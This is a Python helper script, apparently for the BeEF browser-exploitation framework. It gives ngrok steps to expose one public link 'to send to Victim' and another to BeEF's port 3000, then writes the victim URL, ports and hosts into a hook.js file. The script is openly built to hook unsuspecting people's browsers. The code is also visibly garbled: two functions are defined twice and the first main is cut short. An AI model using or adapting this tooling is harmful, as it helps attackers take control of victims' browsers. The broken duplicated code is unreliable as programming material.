#!/usr/bin/python
# -*- coding: utf8 -*-

import random 
import string
import argparse
import os
#from termcolor import colored
Filename="hook.js"

def instruction():
    return """
Instructions :

You need two Links  which are Forwarded To LocalHost:80 and LocalHost:3000
    1. To send to Victim .
    2. Beef listens on Port 3000 ,
       so this link should be forwared to LocalHost:3000 .
    
Just Enter your links in the Script 
Script will do neccessary changes required to opt for your Links .
"""

def ngrok():
    return """    
NGROK Steps :-

STEP 1 : Add these Lines To ngrok.yml [Location ~/.ngrok2/ngrok.yml ]
    
    tunnels:
      first-app:
        addr: 80
        proto: http
      second-app:
        addr: 3000
        proto: http
    
STEP 2 : Now Start ngrok with : 
        ngrok start --all

STEP 3 : You will See 2 different links Forwarded to
    Localhost:80              [ Link To be Sent to Victim ]
        Localhost:3000          [ Your Link will be Connecting to.. ]    
                        
STEP 4 : Enter these links in Script and Follow The Steps given in Script.
"""

def banner():
    print("A   k   i   e   m")
    print(" _____ _____ _____ _____")
    print("|   __|     |     |   __|")
    print("|__   |  |  |  |  |   __|")
    print("|_____|_____|_____|__|   ")

banner()

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

def string_replace(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print(color("[!]"+"Old String not found in "+filename, "red"))
            return
        
    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        print(color("[+] Replacing '"+old_string+"' with '"+new_string+"'"))
        s = s.replace(old_string, new_string)
        f.write(s)
        print(color("[+] String replaced successfully in "+filename, "green"))

def generate_random_string(string_length=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(string_length))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL to send to victim")
    parser.add_argument("-p", "--port", help="Local port to connect to")
    parser.add_argument("-l", "--lhost", help="Local host IP")
    parser.add_argument("-r", "--rhost", help="Remote host IP")
    args = parser.parse_args()
    
    print(banner())
    print(instruction())
    print(ngrok())

def generate_random_string(string_length=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(string_length))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL to send to victim")
    parser.add_argument("-p", "--port", help="Local port to connect to")
    parser.add_argument("-l", "--lhost", help="Local host IP")
    parser.add_argument("-r", "--rhost", help="Remote host IP")
    args = parser.parse_args()
    
    print(banner())
    print(instruction())
    print(ngrok())

    if args.url and args.port and args.lhost and args.rhost:
        print(color("[*] Setting Up Hook.js", "blue"))
        string_replace(Filename, "[URL]", args.url)
        string_replace(Filename, "[PORT]", args.port)
        string_replace(Filename, "[LHOST]", args.lhost)
        string_replace(Filename, "[RHOST]", args.rhost)
    else:
        print(color("[!]"+"Error Occured, Please Check Arguments and Try Again", "red"))

if __name__ == "__main__":
    main()